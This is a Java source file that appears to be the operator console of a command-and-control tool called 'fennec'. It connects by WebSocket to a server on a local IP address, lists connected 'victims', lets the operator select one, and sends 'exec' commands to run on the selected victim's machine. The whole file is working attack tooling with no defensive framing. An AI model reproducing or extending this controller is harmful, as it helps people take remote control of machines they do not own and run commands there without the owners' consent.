package com.heshanthenura.fennec;

import java.net.URI;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Scanner;
import java.util.logging.Logger;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

public class Client extends WebSocketClient {

    public static Commands commands = new Commands();
    public static Logger logger = Logger.getLogger("info");
    public static ArrayList<String> victims = new ArrayList<>();
    public static String selectedVictim = null;
    public static String myID = null;

    public Client(URI serverUri) {
        super(serverUri);
    }

    @Override
    public void onOpen(ServerHandshake serverHandshake) {
        System.out.println("Connected to server: ");
        send(commands.setRole());
        send(commands.getVictims());
    }

    @Override
    public void onMessage(String message) {
        logger.info(message);
        try {
            ObjectMapper objectMapper = new ObjectMapper();
            JsonNode jsonNode = objectMapper.readTree(message);
            if (jsonNode.get("type").asText().equals("notify")){
                System.out.println(jsonNode.get("data").asText());
            } else if (jsonNode.get("type").asText().equals("info")) {
                if (jsonNode.get("info_name").asText().equals("lv")) {
                    JsonNode dataArray = jsonNode.get("data");
                    if (dataArray.isArray()) { // Ensure it's an array
                        victims.clear();
                        for (int i = 0; i < dataArray.size(); i++) {
                            String victim = dataArray.get(i).asText();
                            victims.add(victim);
                            System.out.println("[" + i + "] " + victim);
                        }
                    }
                }else if(jsonNode.get("info_name").asText().equals("my_id")){
                    myID=jsonNode.get("data").asText();
                    System.out.println("My ID is: "+myID);
                }
            }

        } catch (JsonProcessingException e) {
            throw new RuntimeException(e);
        }

    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        System.out.println("Connection closed: " + reason);
    }

    @Override
    public void onError(Exception ex) {
        ex.printStackTrace();
    }

    public static String getSelectedVictim() {
        return selectedVictim;
    }

    public static void setSelectedVictim(String selectedVictim) {
        Client.selectedVictim = selectedVictim;
    }

    public static ArrayList<String> getVictims() {
        return victims;
    }

    public static void main(String[] args) {
        try {
            URI serverUri = new URI("ws://192.168.1.101:8080/ws");
            Client client = new Client(serverUri);
            client.connect();

            while (!client.isOpen()) {

            }


            Scanner scanner = new Scanner(System.in);


            while (true) {
                String message = scanner.nextLine();

                String[] splitMsg = message.split(" ");

                if ("exit".equalsIgnoreCase(message)) {
                    client.close();
                    System.exit(0);
                    break;
                }

                if(message.equals("lv")){
                    client.send(commands.getVictims());
                }else if (message.startsWith("sv ")) {
                    if (getVictims().isEmpty()){
                        System.out.println("Victim list empty try refreshing by lv");
                    }else {
                        try{
                            if (Integer.parseInt(splitMsg[1])>(getVictims().size()-1)){
                                System.out.println("Victim number out of bound");
                            }else{
                                setSelectedVictim(getVictims().get(Integer.parseInt(splitMsg[1])));
                                System.out.println("Victim Selected : "+getVictims().get(Integer.parseInt(splitMsg[1])));

                            }
                        }catch (Exception e){
                            System.out.println("Error Selecting Victims");
                        }
                    }
                } else if(message.startsWith("exec ")){
                    if (getSelectedVictim()==null){
                        System.out.println("No victims selected to execute commands");
                    }else{
                        client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]));
                    }
                }

            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
